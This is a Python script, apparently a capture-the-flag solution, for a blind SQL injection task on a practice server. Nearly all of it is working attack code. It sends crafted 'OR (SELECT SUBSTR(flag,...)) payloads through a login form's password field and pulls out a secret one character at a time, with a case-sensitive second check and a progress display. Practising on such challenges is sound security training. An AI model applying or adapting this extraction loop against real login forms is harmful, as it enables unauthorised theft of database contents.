# This is my solution to SQL injection task on http://tasks.ctfd.kncyber.pl:7013/.
# For correct work python sty module is needed.
# It can be installed with:
# python -m pip install sty

import requests
import sys
from sty import fg


def progress(character):
    """Displays progress bar during searching for next character."""
    character = (character - 19) / 2
    character = int(character)
    sys.stdout.write('\r' + '[' + '#' * character +
                     ' ' * (53 - character) + ']')


flag = ""
character = 32
position = 1
url="http://tasks.ctfd.kncyber.pl:7013/"
print('working...')
while character != 127:
    try:
        r = requests.post(url, data={
                          'name': 'Robert', 'pass': "'OR (SELECT SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character) + "' -- "})
    except requests.exceptions.ConnectionError as e:
        print('\n' + fg.red + '[-] ' + fg.rs +
              'Connection error has occured\n')
        raise
    # comment (--) is necessary to ignore closing ' on server side
    if "Witaj, użytkowniku!" in r.text:
        # new character is found only case is not clear
        r = requests.post(url, data={
                          'name': 'Robert', 'pass': "'OR (SELECT BINARY SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character) + "' -- "})
        # BINARY is necessary for case sensitivity
        if "Witaj, użytkowniku!" in r.text:
            flag += chr(character)
            sys.stdout.write('\033[2K\033[1G')
            print(fg.green + '[+] ' + fg.rs +
                  'new character on position ' + str(position) + ": " + flag)
            position += 1
            character = 32
        else:
            r = requests.post(url, data={
                              'name': 'Robert', 'pass': "'OR (SELECT BINARY SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character + 32) + "' -- "})
            if "Witaj, użytkowniku!" in r.text:
                flag += chr(character + 32)
                sys.stdout.write('\033[2K\033[1G')
                print(fg.green + '[+] ' + fg.rs +
                      'new character on position ' + str(position) + ": " + flag)
                position += 1
                character = 32
    else:
        character += 1
        # these are forbidden characters in this task
        if character == 39:
            character = 40
        if character == 34:
            character = 35
        progress(character)

sys.stdout.write('\033[2K\033[1G')
if len(flag)>0:
    print(fg.yellow + '[!] ' + fg.rs + 'finally: ' + flag)
else:
    print(fg.red+'[!] '+fg.rs+'fail')
